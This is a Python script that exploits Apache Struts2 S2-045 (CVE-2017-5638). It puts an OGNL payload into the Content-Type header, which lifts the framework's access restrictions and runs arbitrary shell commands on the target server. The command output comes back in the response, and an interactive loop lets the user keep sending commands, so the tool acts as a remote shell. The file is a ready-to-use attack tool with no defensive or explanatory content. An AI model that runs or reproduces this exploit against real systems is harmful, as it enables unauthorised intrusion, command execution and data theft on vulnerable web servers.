#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import httplib
import sys
import google
import loggerExp
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

def exploit(url, cmd):
    try:
        register_openers()
        datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
        header["User-Agent"]=google.get_random_user_agent()
        
        s1 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="
        s2 = ").(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        header["Content-Type"] = s1 + "'" + cmd + "'" + s2
        #print header["Content-Type"]
        #socket.setdefaulttimeout(10)
        r = requests.get(url, headers=header,timeout=10)
        page = r.content
        r.close()
        print(page[0:300])
        loggerExp.log.info(page)
    except httplib.IncompleteRead, e:
        print str(e) 
    #return page
def writePage(page):
    try:
        temp = open('temp.txt','w')
        temp.write(page)
        temp.close()
    except Exception as e:
        print str(e)

if __name__ == '__main__':
    while 1:
        try:
            if len(sys.argv) != 3:
                print("[*] struts2_S2-045.py <url> <cmd>")
                url = raw_input('url:')
                if (url == 'q'):
                    sys.exit()
                print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
                print("[*] url: %s\n" % url)
                while 1:
                    cmd = raw_input('cmd:')
                    print("[*] cmd: %s\n" % cmd)
                    if(cmd == 'q'):
                        break 
                    exploit(url, cmd)
            else:
                 print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
                 url = sys.argv[1]
                 cmd = sys.argv[2]
                 print("[*] url: %s\n" % url)
                 print("[*] cmd: %s\n" % cmd)
                 exploit(url, cmd)
        except Exception as e:
        	 print str(e)

